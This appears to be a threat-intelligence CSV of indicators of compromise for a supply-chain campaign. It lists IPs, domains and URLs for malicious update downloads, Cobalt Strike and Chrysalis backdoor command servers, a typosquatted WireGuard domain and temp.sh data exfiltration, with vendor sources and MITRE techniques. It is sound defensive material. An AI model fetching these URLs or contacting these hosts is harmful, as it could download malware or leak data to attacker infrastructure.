ioc_type,ioc_value,chain,context,source,risk,mitre_technique
ip,45.76.155.202,1/2,Malicious update distribution server (http://45.76.155.202/update/update.exe),Kaspersky,CRITICAL,T1195.002
ip,45.32.144.255,3,Malicious update distribution server (http://45.32.144.255/update/update.exe),Kaspersky,CRITICAL,T1195.002
ip,95.179.213.0,2,Malicious update distribution server (October 2025),Kaspersky/CrowdStrike,CRITICAL,T1195.002
ip,45.77.31.210,1,Cobalt Strike Beacon C2 and Metasploit downloader,Kaspersky,CRITICAL,T1071.001
ip,59.110.7.32,n/a,Cobalt Strike Beacon C2 (port 8880) - from multiscanner,Rapid7/CrowdStrike,HIGH,T1071.001
ip,124.222.137.114,n/a,Cobalt Strike Beacon C2 (port 9999) - from multiscanner,Rapid7/CrowdStrike,HIGH,T1071.001
ip,61.4.102.97,n/a,C2 server,CrowdStrike,HIGH,T1071.001
ip,51.91.79.17,1/2,temp.sh IP - exfiltration of reconnaissance data,Kaspersky,HIGH,T1567
domain,cdncheck.it.com,1/2,Cobalt Strike Beacon C2 (/api/update/v1 and /api/FileUpload/submit and /users/admin),Kaspersky,CRITICAL,T1071.001
domain,safe-dns.it.com,2,Cobalt Strike Beacon C2 (/resolve and /dns-query) and Metasploit downloader (/help/Get-Start),Kaspersky,CRITICAL,T1071.001
domain,self-dns.it.com,2,System information upload endpoint (/list),Kaspersky,CRITICAL,T1041
domain,api.skycloudcenter.com,3,Chrysalis backdoor C2,Rapid7/Kaspersky,CRITICAL,T1071.001
domain,api.wiresguard.com,3,Cobalt Strike Beacon C2 (typosquatting WireGuard),Rapid7/Kaspersky,CRITICAL,T1071.001
domain,temp.sh,1/2,Exfiltration of reconnaissance data via curl upload,Kaspersky,HIGH,T1567
url,http://45.76.155.202/update/update.exe,1/2,Malicious update download URL,Kaspersky,CRITICAL,T1195.002
url,http://45.32.144.255/update/update.exe,3,Malicious update download URL,Kaspersky,CRITICAL,T1195.002
url,http://95.179.213.0/update/update.exe,2,Malicious update download URL,Kaspersky,CRITICAL,T1195.002
url,http://95.179.213.0/update/install.exe,2/3,Malicious update download URL (late October),Kaspersky,CRITICAL,T1195.002
url,http://95.179.213.0/update/AutoUpdater.exe,2/3,Malicious update download URL (late October),Kaspersky,CRITICAL,T1195.002
url,http://45.76.155.202/list,1/2,System information upload endpoint,Kaspersky,HIGH,T1041
url,https://self-dns.it.com/list,2,System information upload endpoint,Kaspersky,HIGH,T1041
url,https://45.77.31.210/users/admin,1,Metasploit downloader URL for CS Beacon,Kaspersky,CRITICAL,T1105
url,https://cdncheck.it.com/users/admin,1/2,Metasploit downloader URL for CS Beacon,Kaspersky,CRITICAL,T1105
url,https://safe-dns.it.com/help/Get-Start,2,Metasploit downloader URL for CS Beacon,Kaspersky,CRITICAL,T1105
url,https://45.77.31.210/api/update/v1,1,Cobalt Strike Beacon GET URL,Kaspersky,CRITICAL,T1071.001
url,https://45.77.31.210/api/FileUpload/submit,1,Cobalt Strike Beacon POST URL,Kaspersky,CRITICAL,T1071.001
url,https://cdncheck.it.com/api/update/v1,1,Cobalt Strike Beacon GET URL,Kaspersky,CRITICAL,T1071.001
